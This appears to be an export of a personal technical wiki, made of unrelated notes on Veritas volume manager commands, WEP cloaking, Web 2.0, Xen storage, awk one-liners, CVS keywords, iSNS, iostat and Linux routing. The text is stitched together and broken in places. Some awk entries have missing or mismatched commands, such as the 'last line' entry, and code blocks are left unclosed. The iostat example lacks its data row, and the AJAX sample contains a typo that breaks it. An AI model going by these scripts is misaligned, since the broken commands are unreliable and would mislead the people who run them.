# If a dg already exists, use the vxdgreminor command to change base minor number:
vxdg -g diskgroup reminor new_base_minor
}}}

!Destroying a DG
The vxdg command provides a destroy option that removes a disk group from the system and frees the disks in that disk group for reinitialization: 
{{{
vxdg destroy diskgroup
}}}
If a disk group has been accidentally destroyed, you can recover it, provided that the disks that were in the disk group have not been modified or reused elsewhere.
{{{
vxdisk -s list disk_access_name 
# The disk must be specified by its disk access name, such as sdc.
# Examine the output from the command for a line similar to the 
# following that specifies the disk group ID.
dgid: 963504895.1075.bass
# Use the disk group ID to import the disk group: 
vxdg import dgid
}}}

!vxconfigd
The VxVM configuration daemon (vxconfigd) provides the interface between VxVM commands and the kernel device drivers. vxconfigd handles configuration change requests from VxVM utilities, communicates the change requests to the VxVM kernel, and modifies configuration information stored on disk. vxconfigd also initializes VxVM when the system is booted.
The vxdctl command is the command-line interface to the vxconfigd daemon.

!Volume tagging
Volume tags are used to implement the Dynamic Storage Tiering feature of the
Storage Foundation software.

Tag names can consist of letters (A through Z and a through z), numbers 
(0 through 9), dashes (-), underscores (_) or periods (.) from the ASCII 
character set. A tag name must start with either a letter or an underscore
Tag values can consist of any character from the ASCII character set with a 
decimal value from 32 through 127.

The tag names site, udid and vdid are reserved and should not be used. To 
avoid possible clashes with future product features, it is recommended that 
tag names do not start with any of the following strings: asl, be, isp, nbu, 
sf, symc or vx.

{{{
vxassist [-g diskgroup] settag volume tagname[=tagvalue]

!Volume Read Policies
VxVM offers the choice of the following read policies on the data plexes in a mirrored volume:
* round - Reads each plex in turn in âround-robinâ fashion for each nonsequential I/O detected. Sequential access causes only one plex to be accessed. This takes advantage of the drive or controller read-ahead caching policies.
* prefer - Reads first from a plex that has been named as the preferred plex.  
* select - Chooses a default policy based on plex associations to the volume. If the volume has an enabled striped plex, the select option defaults to preferring that plex; otherwise, it defaults to round-robin.
* siteread - Reads preferentially from plexes at the locally defined site. This is the default policy for volumes in disk groups where site consistency has been enabled.

!Volume sets
Limitations of volume sets
# A maximum of 2048 volumes may be configured in a volume set.
# Only Veritas File System is supported on a volume set.
#  The first volume (index 0) in a volume set must be larger than the sum of the total volume size divided by 4000, the size of the VxFS intent log, and 1MB.
# Raw I/O from and to a volume set is not supported.
# Raw I/O from and to the component volumes of a volume set is supported under certain conditions. 
# Volume sets can be used in place of volumes with the following vxsnap operations on instant snapshots: addmir, dis, make, prepare, reattach, refresh, restore, rmmir, split, syncpause, syncresume, syncstart, syncstop, syncwait, and unprepare. The third-mirror break-off usage model for full-sized instant snapshots is supported for volume sets provided that sufficient plexes exist for each volume in the volume set.
# A full-sized snapshot of a volume set must itself be a volume set with the same number of volumes and the same volume index numbers as the parent. The corresponding volumes in the parent and snapshot volume sets are also subject to the same restrictions as apply between standalone volumes and their snapshots.

To guard against accidental file system and data corruption, the device nodes of the component volumes are configured by default not to have raw and block entries in the /dev/vx/rdsk/diskgroup and /dev/vx/dsk/diskgroup directories. As a result, applications are prevented from directly reading from or writing to the component volumes of a volume set.

Access to the raw device nodes for the component volumes can be configured to be read-only or read-write. This mode is shared by all the raw device nodes for the component volumes of a volume set. The read-only access mode implies that any writes to the raw device will fail, however writes using the ioctl interface or by VxFS to update metadata are not prevented. The read-write access mode allows direct writes via the raw device. The access mode to the raw device nodes of a volume set can be changed as required.

{{{
# To create a volume set for use by VxFS
vxvset [-g diskgroup] -t vxfs make volset volume

# to add volumes to the volume set
vxvset [-g diskgroup] [-f] addvol volset volume

To list the details of the component volumes of a volume set,
vxvset [-g diskgroup] list [volset]

To stop and restart one or more volume sets, use the following commands:
# vxvset [-g diskgroup] stop volset ...
# vxvset [-g diskgroup] start volset ...

<pre>!WEP Cloaking

WEP cracking tools work by collecting WEP encrypted packets over the air, then run them through these statistical attack filters and try to converge to the authorised network's key. Only those packets containing weak ~IVs help in the cracking process. An IV is the initialisation vector which is transmitted in the clear with each WEP encrypted packet and is used along with the WEP key to decrypt the packet. A weak IV is an IV which satisfies one or more of the FMS and Korek statistical attack conditions. 

WEP Cloaking technique sends spoofed WEP encrypted packets a.k.a 'chaff' into the air. These packets are spefically crafted to try and confuse WEP cracking tools which subsequently fail to crack the WEP key. The MAC header would be spoofed o use addresses of the Access Points and clients of the authorized network that the technique is intended to protect. The chagg packtes thus get homegenously mixed with authorized network packets and it is difficult to  tell them apart by glancing at a pakcet trace. 

WEP cracking is byte by byte process. Once the first byte is cracked we move on tot the next byte. All the guessed bytes will be used in guessing into the next bytes. Aircrack prints the votes in favor of the possibilites for that byte and choosed the 'guessed byte' as the one with the highest vote. In prescence of chaffing we will demonstrate that the votes for each possibility for the byte in question show an abnormal bias towards same values. 	

Sequence number based analysis is a well established way of detecting spoofed packets. Because the sequence number space is small and rewinds quite often, we also use IV based analysis for detecting spoofed packets. By using the sequence number and IV tracing as the preprocessor WEP cracking tools such as Aircrack are easily able to crack the key in the prescence of chaffing.

<pre>!Web 2.0
It facilitates collaboration and sharing. Social networking sites , wikis, podcasts, RSS feeds are all based on Web2.0. Web 2.0 does not have any changes to any technical specifications. It mostly evolved by collaboration between different users of web. It allows the use of internet as a platform for interlinking rather than isolated information. Web.2.0 allows web applications to run like locally-available software in the perception of the user. 

Web2.0 allows users to do more than just retrieve information, it allows users to change information. Users can run applications directly from their browser. It is very interactive.  

Examples are
* Altavista vs Google
* Hotmail vs Yahoo mail
* Mapquest vs Google maps
* geocities vx blogger

!Rich Internet Applications
Web applications which are as interactive as desktop applications. Examples are
* AJAX
* FLEX
* ~OpenLazlo
* Silverlight
* ~JavaFX
These applications are run in a secure environment called a sandbox. These applications use server push techniques.   

!!Ajax
Aysnchronous javascript and xml. Uses ~XMLHttpRequestObject to make asynchronous calls to the browser. User performs a page, javascript makes a asynchronous call to the server behind the scene and gives the callback function which should be called when data returns. When the server sends back the informatoin it is updated on the page without refreshing the whole page. It reduces the amount of data that has to be sent on the network and the page need not be in hanged state waiting for the reply from the server to come. 
Javascript is an interpreted language. 

Example
{{{
function ajax(url, vars, callbackFunction){
	var request = window.XMLHttpRequest ? new XMLHttpRequest (): new ActiveXObject(&quot;MSXML2.XMLHTTP.3.0&quot;);
	request.open(&quot;POST&quot;, url, true);
	reuqest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);	
	request.onreadyStateChange = function(){
		if(request.readyState == 4 &amp;&amp; request.status == 200 )
			if(request.responseText)
				callbackFunction(request.responseText);
	};
	request.send(vars);
	}
}}}

!!Adobe FLEX
It allows flash movies to be specified in XML called MXML. FLEX SDK compiles MXML into a flash movie. The advantage here is now flash file is a text file which can be viewed and diffed. 

!!Microsoft Silverlight
Similar to FLEX used to create animation, vector graphics, audio-video playback. .NET languages and development tools can be used to create silverlight applications. It is scriptable with JavaScript. Also works with XAML (XML-based language created and used by microsoft for use in the .NET framwork 3.0 technologies).

!DOM (document-object model)
Allows a platform and language-independent object model for representing HTML and XML and related formats. AJAX uses DOMs to refresh a part of the page without refreshing the whole page. 

!Cascading Style Sheets
It is a language to describe the colours, fonts, layout, and other presentation aspects of a document. It allows separating of persentation from the content. It allows to specify a priority scheme to determine which style sheet to use incase of multiple style sheets, hence called &quot;cascading&quot;. 

!DHTML
It is a collection of technologies used together to create interactive web sites. It allows combining of HTML, Javascript, CSS and DOM&gt; It allows DOM objects to be exposed to javascript, so that javascript can modify these dom objects. 

!REST or XML or JSON(Javascript object notation) APIs
These APIs provide a way for applications like AJAX to send RPCs to the server and retrieve information.

!!REST
Representational State Transfer. Its a way of sending RPCs across network. 

!!SOAP
Simple Object Access Protocol. Its a protocol for exchanging XML-based RPC messages over computer networks normally using HTTP/HTTPS, similar to REST. 

!RSS (Really Simple Syndication)
Allows new content to be sent to subscribers. Websites would tell in a standard format what are the new changes. 

!Mashups
combine web content from various source and create your own website. 


!Copyright, center and left
Thw way it was charcterized politcally, you had copyright which is what the big companies use to lock everything up; you had copyleft, which is free software's way of making sure they can't lock it up; and then berkley had what we called 'copycenter', which is 'take it down to the copy center and make as many copies as you want.'

--Kirk McKusick, BSDCon 1999

!Offline RIA applications
Its a breed of applications which can work offline, they synchronise state when network is available. Google Gears is one of the example. Google Gears installs a database engine, based on SQLite on the client system which locally caches the data. Pages can use this local cache rather than from the online service and synchronise when necessary. This data store can bee accessed via a javascript API. 

!Single Sign on
Single Sign on allows multiple webserver to assume same authentication server and avoid multiple logons. When user logs into a webserver mail.yahoo.com we provide the username and password, and when we visit another website say maps.yahoo.com then the website would automtically redirect to the authentication server which would find that the user has already authenticated when, and would send a key-id to maps.yahoo.com giving information about the user.

<pre>!Server Pools
Server Pools define the physical systems which form a boundary to which virtual machines could be migrated (similar to cluster). Each pool has one volume server. Each node has a volume client. Full storage connectivity to all the nodes. 

[img[images/Server.Pool.png]]

!VSS
Volume shadow copy services. A framework provided by microsoft. Snapshost applications can integrate with VSS to provide consistent snapshots for exchange server and SQL server. 

!Live Migration
A volume that is used by a virtual machine is owned by the volume client on that node. During migration the volume client on the old host machine releases thevolume and the volume client on the new desitnation physical server acquires the volume. 

!XDC Storage model
Xen storage manager provides a API which volume managers has to support for functioning with XDC. 

!!Storage Objects in Xen
# Virtual Block device
** virtual LUN visible and accessible to guest OS. 
# Virtual Disk Image
** Object representing the phyiscal or virtual storage (volume) providing backing store for Vritual Block Device. 
# Storage Repository
** Group of physical devices, which when used with VxVM would be called as Diskgroup. 

!Central Server
Central server is a virtual machine per pool. It acts as Authentication Broker and Database Server. Its a linux guest. 

[img[images/Xen.Central.Server.png]]

!xptrld
It runs of central server and Dom0 and on all instances of guest OS. It is a ligh-weight http server. 

!Managed Host
Managed host is the managed virtual mahcine. It has Agentlets which is used for storage managers to discover objects or applicationss in the virtual machine. It also hosts DCLI which provides a CLI to do various administrative tasks in the virtual machine. It hosts XDC Reporter, which sends updates to the storage manager about the changes int the virtual machine.  Management Scripts that could be executed from the storage manager to do operations on the virtual mahine. It hosts VRTSat for authentication. 

!DCLI (Windows Guest CLI)
CLI is provided in the guest to discover LUNs used and applications running in the virtual machine. It provides CLI to take snapshots from inside the virtual machine. Also Scheduler CLIs. 

!VSS Plug-in
It contains 2 components
# Requestor - which starts the process of creating a snapshot, by using VSS API provided by windows to get a consistent state. 
# Provider - is a hardware snapshot provider. It communicates with Dom0 for creating volume snapshot.

!SCSI Provision
Each of the virtual LUNs observed by guest OS are visible to the guest OSes as SCSI devices. These SCSI devices only support a limited number of commands. THese SCSI devices do not support SCSI Reservations. Certain features such as Vxfen do not work on these devices.

<pre>!CCR - Continous checkpoint and rewind

Software based fault-tolerance against h/w failure, against complete virtual machine failure. Not against protection against software faults in the virtual machine. 

XSFT works by blocking the externally visible output
# Network packets are not sent to the client immediately
# Disk writes are not scheduled immediately
# Output sent only after a checkpoint

The client does not see intermediate system state, system moves from one checkpoint to the other. Failure becomes part of the intermediate state, client does not know when a failure happens. The interval between 2 checkpoints is called an ''epoch''. 

During checkpoint the entire execution context of a virtual machine is replicated. CPU register state, contents of geust physical memory (changes), disk I/O state, network I/O state is transferred to other machine (using usually infiniband)

HANDY ONE-LINE SCRIPTS FOR AWK                               30 April 2008
Compiled by Eric Pement - eric [at] pement.org               version 0.27

Latest version of this file (in English) is usually at:
   http://www.pement.org/awk/awk1line.txt

This file will also be available in other languages:
   Chinese  - http://ximix.org/translation/awk1line_zh-CN.txt   

USAGE:

   Unix: awk '/pattern/ {print &quot;$1&quot;}'    # standard Unix shells
DOS/Win: awk '/pattern/ {print &quot;$1&quot;}'    # compiled with DJGPP, Cygwin
         awk &quot;/pattern/ {print \&quot;$1\&quot;}&quot;  # GnuWin32, UnxUtils, Mingw

Note that the DJGPP compilation (for DOS or Windows-32) permits an awk
script to follow Unix quoting syntax '/like/ {&quot;this&quot;}'. HOWEVER, if the
command interpreter is CMD.EXE or COMMAND.COM, single quotes will not
protect the redirection arrows (&lt;, &gt;) nor do they protect pipes (|).
These are special symbols which require &quot;double quotes&quot; to protect them
from interpretation as operating system directives. If the command
interpreter is bash, ksh or another Unix shell, then single and double
quotes will follow the standard Unix usage.

Users of MS-DOS or Microsoft Windows must remember that the percent
sign (%) is used to indicate environment variables, so this symbol must
be doubled (%%) to yield a single percent sign visible to awk.

If a script will not need to be quoted in Unix, DOS, or CMD, then I
normally omit the quote marks. If an example is peculiar to GNU awk,
the command 'gawk' will be used. Please notify me if you find errors or
new commands to add to this list (total length under 65 characters). I
usually try to put the shortest script first. To conserve space, I
normally use '1' instead of '{print}' to print each line. Either one
will work.

FILE SPACING:

 # double space a file
 awk '1;{print &quot;&quot;}'
 awk 'BEGIN{ORS=&quot;\n\n&quot;};1'

 # double space a file which already has blank lines in it. Output file
 # should contain no more than one blank line between lines of text.
 # NOTE: On Unix systems, DOS lines which have only CRLF (\r\n) are
 # often treated as non-blank, and thus 'NF' alone will return TRUE.
 awk 'NF{print $0 &quot;\n&quot;}'

 # triple space a file
 awk '1;{print &quot;\n&quot;}'

NUMBERING AND CALCULATIONS:

 # precede each line by its line number FOR THAT FILE (left alignment).
 # Using a tab (\t) instead of space will preserve margins.
 awk '{print FNR &quot;\t&quot; $0}' files*

 # precede each line by its line number FOR ALL FILES TOGETHER, with tab.
 awk '{print NR &quot;\t&quot; $0}' files*

 # number each line of a file (number on left, right-aligned)
 # Double the percent signs if typing from the DOS command prompt.
 awk '{printf(&quot;%5d : %s\n&quot;, NR,$0)}'

 # number each line of file, but only print numbers if line is not blank
 # Remember caveats about Unix treatment of \r (mentioned above)
 awk 'NF{$0=++a &quot; :&quot; $0};1'
 awk '{print (NF? ++a &quot; :&quot; :&quot;&quot;) $0}'

 # count lines (emulates &quot;wc -l&quot;)
 awk 'END{print NR}'

 # print the sums of the fields of every line
 awk '{s=0; for (i=1; i&lt;=NF; i++) s=s+$i; print s}'

 # add all fields in all lines and print the sum
 awk '{for (i=1; i&lt;=NF; i++) s=s+$i}; END{print s}'

 # print every line after replacing each field with its absolute value
 awk '{for (i=1; i&lt;=NF; i++) if ($i &lt; 0) $i = -$i; print }'
 awk '{for (i=1; i&lt;=NF; i++) $i = ($i &lt; 0) ? -$i : $i; print }'

 # print the total number of fields (&quot;words&quot;) in all lines
 awk '{ total = total + NF }; END {print total}' file

 # print the total number of lines that contain &quot;Beth&quot;
 awk '/Beth/{n++}; END {print n+0}' file

 # print the largest first field and the line that contains it
 # Intended for finding the longest string in field #1
 awk '$1 &gt; max {max=$1; maxline=$0}; END{ print max, maxline}'

 # print the number of fields in each line, followed by the line
 awk '{ print NF &quot;:&quot; $0 } '

 # print the last field of each line
 awk '{ print $NF }'

 # print the last field of the last line
 awk '{ field = $NF }; END{ print field }'

 # print every line with more than 4 fields
 awk 'NF &gt; 4'

 # print every line where the value of the last field is &gt; 4
 awk '$NF &gt; 4'

STRING CREATION:

 # create a string of a specific length (e.g., generate 513 spaces)
 awk 'BEGIN{while (a++&lt;513) s=s &quot; &quot;; print s}'

 # insert a string of specific length at a certain character position
 # Example: insert 49 spaces after column #6 of each input line.
 gawk --re-interval 'BEGIN{while(a++&lt;49)s=s &quot; &quot;};{sub(/^.{6}/,&quot;&amp;&quot; s)};1'

ARRAY CREATION:

 # These next 2 entries are not one-line scripts, but the technique
 # is so handy that it merits inclusion here.
 
 # create an array named &quot;month&quot;, indexed by numbers, so that month[1]
 # is 'Jan', month[2] is 'Feb', month[3] is 'Mar' and so on.
 split(&quot;Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec&quot;, month, &quot; &quot;)

 # create an array named &quot;mdigit&quot;, indexed by strings, so that
 # mdigit[&quot;Jan&quot;] is 1, mdigit[&quot;Feb&quot;] is 2, etc. Requires &quot;month&quot; array
 for (i=1; i&lt;=12; i++) mdigit[month[i]] = i

TEXT CONVERSION AND SUBSTITUTION:

 # IN UNIX ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 awk '{sub(/\r$/,&quot;&quot;)};1'   # assumes EACH line ends with Ctrl-M

 # IN UNIX ENVIRONMENT: convert Unix newlines (LF) to DOS format
 awk '{sub(/$/,&quot;\r&quot;)};1'

 # IN DOS ENVIRONMENT: convert Unix newlines (LF) to DOS format
 awk 1

 # IN DOS ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 # Cannot be done with DOS versions of awk, other than gawk:
 gawk -v BINMODE=&quot;w&quot; '1' infile &gt;outfile

 # Use &quot;tr&quot; instead.
 tr -d \r &lt;infile &gt;outfile            # GNU tr version 1.22 or higher

 # delete leading whitespace (spaces, tabs) from front of each line
 # aligns all text flush left
 awk '{sub(/^[ \t]+/, &quot;&quot;)};1'

 # delete trailing whitespace (spaces, tabs) from end of each line
 awk '{sub(/[ \t]+$/, &quot;&quot;)};1'

 # delete BOTH leading and trailing whitespace from each line
 awk '{gsub(/^[ \t]+|[ \t]+$/,&quot;&quot;)};1'
 awk '{$1=$1};1'           # also removes extra space between fields

 # insert 5 blank spaces at beginning of each line (make page offset)
 awk '{sub(/^/, &quot;     &quot;)};1'

 # align all text flush right on a 79-column width
 awk '{printf &quot;%79s\n&quot;, $0}' file*

 # center all text on a 79-character width
 awk '{l=length();s=int((79-l)/2); printf &quot;%&quot;(s+l)&quot;s\n&quot;,$0}' file*

 # substitute (find and replace) &quot;foo&quot; with &quot;bar&quot; on each line
 awk '{sub(/foo/,&quot;bar&quot;)}; 1'           # replace only 1st instance
 gawk '{$0=gensub(/foo/,&quot;bar&quot;,4)}; 1'  # replace only 4th instance
 awk '{gsub(/foo/,&quot;bar&quot;)}; 1'          # replace ALL instances in a line

 # substitute &quot;foo&quot; with &quot;bar&quot; ONLY for lines which contain &quot;baz&quot;
 awk '/baz/{gsub(/foo/, &quot;bar&quot;)}; 1'

 # substitute &quot;foo&quot; with &quot;bar&quot; EXCEPT for lines which contain &quot;baz&quot;
 awk '!/baz/{gsub(/foo/, &quot;bar&quot;)}; 1'

 # change &quot;scarlet&quot; or &quot;ruby&quot; or &quot;puce&quot; to &quot;red&quot;
 awk '{gsub(/scarlet|ruby|puce/, &quot;red&quot;)}; 1'

 # reverse order of lines (emulates &quot;tac&quot;)
 awk '{a[i++]=$0} END {for (j=i-1; j&gt;=0;) print a[j--] }' file*

 # if a line ends with a backslash, append the next line to it (fails if
 # there are multiple lines ending with backslash...)
 awk '/\\$/ {sub(/\\$/,&quot;&quot;); getline t; print $0 t; next}; 1' file*

 # print and sort the login names of all users
 awk -F &quot;:&quot; '{print $1 | &quot;sort&quot; }' /etc/passwd

 # print the first 2 fields, in opposite order, of every line
 awk '{print $2, $1}' file

 # switch the first 2 fields of every line
 awk '{temp = $1; $1 = $2; $2 = temp}' file

 # print every line, deleting the second field of that line
 awk '{ $2 = &quot;&quot;; print }'

 # print in reverse order the fields of every line
 awk '{for (i=NF; i&gt;0; i--) printf(&quot;%s &quot;,$i);print &quot;&quot;}' file

 # concatenate every 5 lines of input, using a comma separator
 # between fields
 awk 'ORS=NR%5?&quot;,&quot;:&quot;\n&quot;' file

SELECTIVE PRINTING OF CERTAIN LINES:

 # print first 10 lines of file (emulates behavior of &quot;head&quot;)
 awk 'NR &lt; 11'

 # print first line of file (emulates &quot;head -1&quot;)
 awk 'NR&gt;1{exit};1'

  # print the last 2 lines of a file (emulates &quot;tail -2&quot;)
 awk '{y=x &quot;\n&quot; $0; x=$0};END{print y}'

 # print the last line of a file (emulates &quot;tail -1&quot;)

 awk '$5 == &quot;abc123&quot;'

 # print only those lines where field #5 is NOT equal to &quot;abc123&quot;
 # This will also print lines which have less than 5 fields.
 awk '$5 != &quot;abc123&quot;'
 awk '!($5 == &quot;abc123&quot;)'

 # matching a field against a regular expression
 awk '$7  ~ /^[a-f]/'    # print line if field #7 matches regex
 awk '$7 !~ /^[a-f]/'    # print line if field #7 does NOT match regex

 # print the line immediately before a regex, but not the line
 # containing the regex
 awk '/regex/{print x};{x=$0}'
 awk '/regex/{print (NR==1 ? &quot;match on line 1&quot; : x)};{x=$0}'

 # print the line immediately after a regex, but not the line
 # containing the regex
 awk '/regex/{getline;print}'

 # grep for AAA and BBB and CCC (in any order on the same line)

SELECTIVE DELETION OF CERTAIN LINES:

 # delete ALL blank lines from a file (same as &quot;grep '.' &quot;)
 awk NF
 awk '/./'

 # remove duplicate, consecutive lines (emulates &quot;uniq&quot;)
 awk 'a !~ $0; {a=$0}'

the first release of this FAQ file, and to Daniel Jana, Yisu Dong, and
others for their suggestions and corrections.

  &quot;GAWK: Effective awk Programming,&quot; 3d edition, by Arnold D. Robbins
  (O'Reilly, 2003) or at http://www.gnu.org/software/gawk/manual/

To fully exploit the power of awk, one must understand &quot;regular
expressions.&quot; For detailed discussion of regular expressions, see
&quot;Mastering Regular Expressions, 3d edition&quot; by Jeffrey Friedl (O'Reilly,
2006).

The info and manual (&quot;man&quot;) pages on Unix systems may be helpful (try
&quot;man awk&quot;, &quot;man nawk&quot;, &quot;man gawk&quot;, &quot;man regexp&quot;, or the section on
regular expressions in &quot;man ed&quot;).

USE OF '\t' IN awk SCRIPTS: For clarity in documentation, I have used
'\t' to indicate a tab character (0x09) in the scripts.  All versions of
awk should recognize this abbreviation.

Keyword list
{{{
$Author$
    The login name of the user who checked in the revision. 
$Date$
    The date and time (UTC) the revision was checked in. 
$Header$
    A standard header containing the full pathname of the RCS file, the revision number, the date (UTC), the author, the state, and the locker (if locked). Files will normally never be locked when you use CVS. 
$Id$
    Same as $Header$, except that the RCS filename is without a path. 
$Name$
    Tag name used to check out this file. The keyword is expanded only if one checks out with an explicit tag name. For example, when running the command cvs co -r first, the keyword expands to ‘Name: first’. 
$Locker$
    The login name of the user who locked the revision (empty if not locked, which is the normal case unless cvs admin -l is in use). 
$Log$
    The log message supplied during commit, preceded by a header containing the RCS filename, the revision number, the author, and the date (UTC). Existing log messages are not replaced. Instead, the new log message is inserted after $Log:...$. Each new line is prefixed with the same string which precedes the $Log keyword. For example, if the file contains:

      /* Here is what people have been up to:
       *
       * $Log: frob.c,v $
       * Revision 1.1  1997/01/03 14:23:51  joe
       * Add the superfrobnicate option
       *
       */

    then additional lines which are added when expanding the $Log keyword will be preceded by ‘ * ’. Unlike previous versions of CVS and RCS, the comment leader from the RCS file is not used. The $Log keyword is useful for accumulating a complete change log in a source file, but for several reasons it can be problematic. See section 12.5 Problems with the $Log$ keyword.. 
$RCSfile$
    The name of the RCS file without a path. 
$Revision$
    The revision number assigned to the revision. 
$Source$
    The full pathname of the RCS file. 
$State$
    The state assigned to the revision. States can be assigned with cvs admin -s---see section A.6.1 admin options.

<pre>This option forces the filesystem identification portion of the file handle and file attributes used on the wire to be num instead of a number derived from the major and minor number of the block device on which the filesystem is mounted. Any 32 bit number can be used, but it must be unique amongst all the exported filesystems.

This can be useful for NFS failover, to ensure that both servers of the failover pair use the same NFS file handles for the shared filesystem thus avoiding stale file handles after failover.

fsid=0 has magic properties in NFSv4. For NFSv4, there is a distinguished filesystem which is the root of all exported filesystem. This is specified with fsid=root or fsid=0 both of which mean exactly the same thing.

<pre>!iSNS
Internet Storage Name Service (iSNS) protocol allows automated discovery, management and configuration of iSCSI and Fibre Channel devices (using iFCP gateways) on a TCP/IP network.

Components
* The iSNS Protocol (iSNSP)
* iSNS clients
* iSNS servers
* iSNS databases

Service provided
* Name Registration and Storage Resource Discovery
* Discovery Domains and Login Control
* State Change Notification
* Bidirectional Mappings Between Fibre Channel and iSCSI Devices - Because the iSNS database stores naming and discovery information about both Fibre Channel and iSCSI devices, iSNS servers are able to store mappings of Fibre Channel devices to proxy iSCSI device images on the IP network. These mappings may also be made in the opposite direction, allowing iSNS servers to store mappings from iSCSI devices to proxy WWNs.

!RFC
RFC 4171: Internet Storage Name Service (iSNS)

!Entity Status monitoring
* iSCSI target device may register for Entity Status Inquiry (ESI) messages
* Entity Status Inquiry (ESI)  message is sent by the iSNS server, and is used to verify that an iSNS client Portal is reachable and available.
* If the Portal fails to respond to an administratively-determined number of consecutive ESI messages, then the iSNS server SHALL remove that Portal from the iSNS database. 
* Appropriate State Change Notifications, if any, SHALL be triggered. 

!iSNS Server Discovery by clients
* Static
* SLP (Service Location Protocol)
* DHCP (rfc 4174)
* Broadcast from Server (periodically)

Note: await includes svctim. Infact await (average time taken for each IO Request to complete) = the average time that each request was in queue (lets call it queuetime) PLUS the average time each request took to process (svctm)
!%util
Percentage of CPU time during which I/O requests were issued to the device (bandwidth utilization for the device). Device saturation occurs when this value is close to 100%.


!Interpreting iostat values
Lets take the above example

{{{
Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await  svctm  %util

}}}
* avg time that each request spent in queue (qtime) = await – svctime = 17.33 – 0.96 =&gt; 16.37 ms
* avg time tha each request spent being serviced = 0.96 ms
* so averagely each IO request spent 17.33ms to et processed of which 16.37 ms were spent just waiting in queue
* %util can be calculated as (r/s + w/s) * svctim / 1000ms * 100  =&gt; 1025*0.96/1000 * 100 =&gt; 98.5%
* This simple means that in a 1 second interval, 1025 requests were sent to disk, each of which took 0.96ms for the disk to process resulting in 984 ms of disk utilization time in a period of 1 s (or 1000 ms). This means the disk is greater than 98% utilized

On this disk subsystem, it is clear that the disk cannot process more IO requests than what it is getting

http://bhavin.directi.com/iostat-and-disk-utilization-monitoring-nirvana/

On every Linux box the following should be graphed at 5 minute averages

* %util: When this figure is consistently approaching above 80% you will need to take any of the following actions -
** increasing RAM so dependence on disk reduces
** increasing RAID controller cache so disk dependence decreases
** increasing number of disks so disk throughput increases (more spindles working parallely)
** horizontal partitioning
* (await-svctim)/await*100: The percentage of time that IO operations spent waiting in queue in comparison to actually being serviced. If this figure goes above 50% then each IO request is spending more time waiting in queue than being processed. If this ratio skews heavily upwards (in the &gt;75% range) you know that your disk subsystem is not being able to keep up with the IO requests and most IO requests are spending a lot of time waiting in queue. In this scenario you will again need to take any of the actions above
* %iowait: This number shows the % of time the CPU is wasting in waiting for IO. A part of this number can result from network IO, which can be avoided by using an Async IO library. The rest of it is simply an indication of how IO-bound your application is. You can reduce this number by ensuring that disk IO operations take less time, more data is available in RAM, increasing disk throughput by increasing number of disks in a RAID array, using SSD (Check my post on Solid State drives vs Hard Drives) for portions of the data or all of the data etc

}}}

 There are a few items of note. You can use ip address add even if the link layer on the device is down. This means that you can readdress an interface without bringing it up. When you add an address within the same CIDR network as another address on the same interface, the second address becomes a secondary address, meaning that if the first address is removed, the second address will also be purged from the interface.

In order to support compatibility with ifconfig the ip address command allows the user to specify a label on every hosted address on a given device. After adding an address to an interface as we did in Example C.7, “Adding IP addresses to an interface with ip address”, ifconfig will not report that the new IP 192.168.99.37 is hosted on the same device as the primary IP 192.168.99.35. In order to prevent this sort of confusion or apparently contradictory output, you should get in the habit of using the label option to identify each IP hosted on a device. Let's take a look at how to remove the 192.168.99.37 IP from eth0 and add it back so that ifconfig will report the presence of another IP on the eth0 device.

The first field in this output tells us whether the route is for a broadcast address or an IP address or range locally hosted on this machine. Subsequent fields inform us through which device the destination is reachable, and notably (in this table) that the kernel has added these routes as part of bringing up the IP layer interfaces.

For each IP hosted on the machine, it makes sense that the machine should restrict accessiblity to that IP or IP range to itself only. This explains why, in Example D.12, Viewing the local routing table with ip route show table local, 192.168.99.35 has a host scope. Because tristan hosts this IP, there's no reason for the packet to be routed off the box. Similarly, a destination of localhost (127.0.0.1) does not need to be forwarded off this machine. In each of these cases, the scope has been set to host.

For broadcast addresses, which are intended for any listeners who happen to share the IP network, the destination only makes sense as for a scope of devices connected to the same link layer [49].

With this output, you'll get just a bit more information about the routes. The most interesting datum is usually the &quot;used&quot; field, which indicates the number of times this route has been accessed in the routing cache. This can give you a very good idea of how many times a particular route has been used. The age field is used by the kernel to decide when to expire a cache entry. The age is reset every time the route is accessed

ip route get simulates a request for the specified destination, ip route get causes the routing selection algorithm to be run. When this is complete, it prints out the resulting path to the destination. In one sense, this is almost equivalent to sending an ICMP echo request packet and then using ip route show cache.

!Packet Traversal for ~Non-Local Destination
* All of the PREROUTING netfilter hooks are called here. This means that we get our first opportunity to inspect and drop a packet, we can perform DNAT on the packet to make sure that the destination IP is rewritten before we make a routing decision (at which time the destination address becomes very important). We can also set ~ToS or an fwmark on the packet at this time. If we want to use an IMQ device for ingress control, we can put our hooks here.
* If we are using ipchains, the input chain is traversed.
* Any traffic control on the real device on which the packet arrived is now performed.
* The input routing stage is traversed by any packet entering the local machine. Here we concern ourselves only with packets which are routed through this machine to another destination Additionally, iproute2 NAT occurs here [36].
* The packet enters the FORWARD netfilter hooks. Here, the packet can be mangled with ~ToS or fwmark. After the mangle chain is passed, the filter chain will be traversed. For kernel 2.4-based routing devices this will be the location for packet filtering rules. If we are using ipchains, the forward chain would be traversed here instead of the netfilter FORWARD hooks.
* The output chain in an ipchains installation would be traversed here.
* The POSTROUTING netfilter hooks are traversed. These include packet mangling, NAT and IMQ for egress.
* Finally, the packet is transmitted via the outbound device per traffic control configuration on that outbound device. 

!Packet Traversal for Local Destination
* All of the PREROUTING netfilter hooks are called here. This means that we get our first opportunity to inspect and drop a packet, we can perform DNAT on the packet to make sure that the destination IP is rewritten before we make a routing decision (at which time the destination address becomes very important).

* Any traffic control on the real device on which the packet arrived is now performed.
* The input routing stage is traversed by any packet entering the local machine. Here we concern ourselves with packets bound for local destinations only.
* The INPUT netfilter hooks are traversed. Commonly this is filtering for inbound connections, but can include packet mangling.
* The local destination process receives the connection. If there is no open socket, an error is generated. 

!Packet Traversal for Locally Generated
* The process with the open socket sends data.
* The routing decision is made. This is frequently called output routing because it is only for packets leaving the system. This routing code is (sometimes?) responsible for selecting the source IP of the outbound packet.
* The netfilter OUTPUT hooks are traversed. The basic filter, nat, and mangle hooks are available. This is where SNAT can take place.
* The output chain in an ipchains installation would be traversed here.
* The POSTROUTING netfilter hooks are traversed. These include packet mangling, NAT and IMQ for egress.

